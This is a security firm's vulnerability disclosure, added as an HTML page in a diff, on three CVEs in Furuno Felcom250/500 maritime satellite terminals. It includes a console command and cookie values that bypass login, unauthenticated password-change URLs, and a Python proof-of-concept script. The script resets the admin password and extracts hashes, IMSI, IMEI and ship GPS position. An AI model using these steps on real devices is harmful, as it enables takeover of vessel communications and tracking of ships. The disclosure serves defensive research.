@@ -1,0 +1,227 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CyberSKR - Cyber Security</title>
+
+<meta name="author" content="CyberSKR" />
+<meta name="description" content="The CyberSKR Maritime Security team identified and registered several vulnerabilities in the Furuno250 / Furuno500 Inmarsat FleetBroadband Systems." />
+
+<meta property="og:title" content="CyberSKR Maritime Security - Furuno Felcom250 / Felcom500 Vulnerabilities" />
+<meta property="og:description" content="The CyberSKR Maritime Security team identified and registered several vulnerabilities in the Furuno250 / Furuno500 Inmarsat FleetBroadband Systems" />
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:url" content="https://cyberskr.com/blog/furuno-felcom.html" />
+<meta name="twitter:title" content="CyberSKR Maritime Security - Furuno Felcom250 / Felcom500 Vulnerabilities" />
+<meta name="twitter:image" content="https://cyberskr.com/blog/media/felcom/change-pw-form.jpg"/>
+<meta name="twitter:description" content="CyberSKR Maritime Security - Several vulnerabilities in the Furuno250 / Furuno500 Inmarsat FleetBroadband Systems" />
+<meta name="twitter:site" content="@AlexiBitsios" />
+<meta name="twitter:creator" content="@AlexiBitsios" />
+
+<meta property="og:image" content="https://cyberskr.com/blog/media/felcom/change-pw-form.jpg"/>
+<meta property="og:url" content="https://cyberskr.com/blog/furuno-felcom.html"/>
+
+<link href="../assets/css/contact.css" rel="stylesheet" type="text/css" />
+<link href="../assets/css/style.css" rel="stylesheet" type="text/css" />
+<link href="../assets/css/blog.css" rel="stylesheet" type="text/css" />
+
+<style type="text/css">
+.blog {
+	position: relative;
+}
+.blog .post .post_header {
+	font-size: 26px;
+	text-align: center;
+	margin-bottom: 20px;
+}
+a.blog_link {
+	top: 30px;
+}
+@media screen and (max-width: 600px) {
+	a.blog_link {
+		right: 35px;
+		top: 35px;
+		bottom: auto;
+		text-align: right;
+	}
+}
+</style>
+</head>
+
+<body>
+	<div class="overlay">
+		<a href="/" title="CyberSKR Homepage"><img src="../assets/images/logo-white.png" width="230" height="35" class="logo" title="CyberSKR - Cyber Security Consultancy" alt="CyberSKR" /></a>
+		<a href="/blog/" class="blog_link">Blog</a>
+		<div class="blog">
+			<div class="post">
+				<h2 class="post_header">Furuno Felcom250 / Felcom500 Vulnerabilities</h2>
+
+				<p>The CyberSKR Maritime Security team identified and registered multiple vulnerabilities in the Furuno250 / Furuno500 Inmarsat FleetBroadband Systems. The vulnerabilities relate to client-side authentication (server-side auth bypass), incorrect access control (unauthorised password change) and (cleartext) password disclosure.</p>
+
+				<h3>CVE-2018-16590: Client-Side Authentication</h3>
+				<p>Analysis of the JavaScript files included in the Felcom dashboard identified a file of interest, &quot;/login.js&quot;. The process flow indicated that if the login request was successful, then the function setLoginData(&quot;username&quot;) would be executed. This set a Cookie with the login details.</p>
+
+				<p><img src="media/felcom/landing-page-logged-in.jpg" alt="That's A Paddlin'" title="That's A Paddlin'" /></p>
+
+				<p>Due to this a malicious actor could execute the JavaScript function in their browser's console to bypass all authentication checks. This created a valid login session and allow them to access an account without knowledge of their password. Alternatively, the same can also be achieved by setting two cookie values (shown below).</p>
+
+				<p><strong>Admin Login (browser console): </strong>setLoginData(&quot;Admin&quot;);<br><strong>Admin Cookie: </strong>Cookie: sm_login=true; sm_loginmode=Admin</p>
+
+				<p style="margin-bottom: 0;">Known user accounts are:</p>
+					<ul style="margin: 10px 0 40px;">
+						<li>Log</li>
+						<li>Admin</li>
+						<li>Service</li>
+					</ul>
+
+
+				<h3>CVE-2018-16591: Incorrect Access Control</h3>
+				<p>Coming across the password change page, logged in as Admin, three options appear. Password, Log, and SIM, none of which ask for the current password. Following the steps in the JavaScript source once more, a request is made to two separate pages (one for Password &amp; Log and another for SMS). A successful password change returns a &quot;200 OK&quot; message, and a failure returned a &quot;400 Bad Request&quot;.</p>
+
+				<p><img src="media/felcom/change-pw-form.jpg" alt="XML Credentials File" title="XML Credentials File" /></p>
+
+				<p>Replace &lt;MD5_HASH&gt; with the hash for your desired password (e.g. md5("MyNewPassword")). Replace &lt;NEW_SMS_PASS&gt; with your desired cleartext SMS Server password.</p>
+
+				<p><strong>Example Admin Password Change:</strong><br>/cgi-bin/sm_changepassword.cgi?&lt;MD5_HASH&gt;+&lt;MD5_HASH_REPEAT&gt;+Admin</p>
+				<p><strong>Example SMS Server Password Change:</strong><br>/cgi-bin/sm_sms_changepasswd.cgi?undefined+&lt;NEW_SMS_PASS&gt;+&lt;NEW_SMS_PASS_REPEAT&gt;</p>
+
+				<p>It was also determined these requests could be made unauthenticated.</p>
+
+
+				<h3>CVE-2018-16705: (Cleartext) Password Disclosure</h3>
+				<p>Through using the application, a file of interest called &quot;/xml/permission.xml&quot; was identified. Loading the file displayed a list of all the users and their password in an un-salted MD5 format. Furthermore, a cleartext entry for the SMS server's password is also included at the bottom.</p>
+
+				<p><img src="media/felcom/xml-passwords.jpg" alt="XML Credentials File" title="XML Credentials File" /></p>
+
+				<p>Analysing the login process, it was determined you could then use these hash values in a
+				&quot;Pass-The-Hash&quot; style attack due to the implementation. This means that in the event the cleartext value can't be ascertained from the hash, a malicious actor can still bypass the login mechanisms that are in place.</p>
+
+				<p><img src="media/felcom/pass-the-hash.jpg" alt="Pass The Hash" title="Pass The Hash" /></p>
+
+				<h3>Proof of Concept Password Change (Python)</h3>
+				<p><img src="media/felcom/furuno-exploit.jpg" alt="Felcom Exploit" title="Felcom Exploit" /></p>
+				<pre>import xml.etree.ElementTree
+import requests
+import md5
+import sys
+
+# Replace with your target
+the_ip = "http://127.0.0.1:4443"
+
+user = "Admin"
+
+# Download credentials from host
+def getHashes(to_check):
+
+    print "[*] Downloading hashes"
+    # Download credentials XML file
+    dl_xml = requests.get(the_ip+"/xml/permission.xml")
+
+    if(dl_xml.status_code != 200):
+        print "[*] Error downloading credentials file"
+        sys.exit(0)
+
+    # Parse downloaded credential file
+    parsed = xml.etree.ElementTree.fromstring(dl_xml.text)
+
+    # List users and hashes
+    if not to_check:
+        for i in range(0,4):
+            if i==3:
+                print "SMS Server: "+parsed[i][0].text
+            else:
+                print parsed[i][0].text+": "+parsed[i][1].text
+
+    # Check if hash update applied successfully
+    else:
+        for i in range(0,3):
+            if parsed[i][0].text == user:
+                if parsed[i][1].text == to_check:
+                    print user+": Password update verified"
+                else:
+                    print user+": Password update mismatch"
+
+# Change user's password
+def changePw(new_pass):
+
+    print "[*] Changing password for "+user
+
+    # Generate new MD5 hash
+    m = md5.new()
+    m.update(new_pass)
+    gen_md5 = m.hexdigest()
+
+    # Send credential update request
+    r = requests.get(the_ip+"/cgi-bin/sm_changepassword.cgi?"+gen_md5+"+"+gen_md5+"+"+user)
+
+    # Check if change was successful
+    if(r.status_code == 200):
+        print "Password successfully changed: "+user+" - "+new_pass
+    else:
+        print "Error changing password credentials file"
+        sys.exit(0)
+
+    # Check if hash correctly updated
+    getHashes(gen_md5)
+
+# Get device info
+def getInfo():
+    print "[*] Downloading info\n"
+    # Download info XML file
+    r_inf = requests.get(the_ip+"/xml/info.xml")
+    r_gps = requests.get(the_ip+"/xml/modem_status.xml")
+
+    if(r_inf.status_code != 200 or r_gps.status_code != 200):
+        print "[*] Error downloading info file"
+        sys.exit(0)
+
+    # Parse downloaded inf file
+    parsed_inf = xml.etree.ElementTree.fromstring(r_inf.text)
+    parsed_gps = xml.etree.ElementTree.fromstring(r_gps.text.encode('utf-8'))
+
+    print "Device Info:"
+    print "[*] Maunfacturer: "+str(parsed_inf[0][0].text)
+    print "[*] Model: "+str(parsed_inf[0][1].text)
+    print "[*] Serial Number: "+str(parsed_inf[0][3].text)
+
+    print
+
+    print "SIM Info:"
+    print "[*] USIMCardID: "+str(parsed_inf[0][4].text)
+    print "[*] IMSI: "+str(parsed_inf[0][5].text)
+    print "[*] IMEI: "+str(parsed_inf[0][6].text)
+
+    print
+
+    print "GPS Info:"
+    print "[*] Lat: "+str(parsed_gps[7][0].text.encode('utf-8'))
+    print "[*] Lat: "+str(parsed_gps[7][1].text.encode('utf-8'))
+    print "[*] Last Update: "+str(parsed_gps[7][4].text)
+
+		print "\n"
+
+def main():
+    getInfo()
+
+    # Change 'user' password to default (01234567)
+    changePw("01234567")
+
+if __name__ == "__main__":
+	main()
+</pre>
+
+	</div>
+	</div>
+	<div class="cookies">This website uses cookies</div>
+	</div>
+	<script type="text/javascript" src="assets/js/jquery.js"></script>
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120926716-1"></script>
+	<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-120926716-1');
+	</script>
+</body>
+</html>
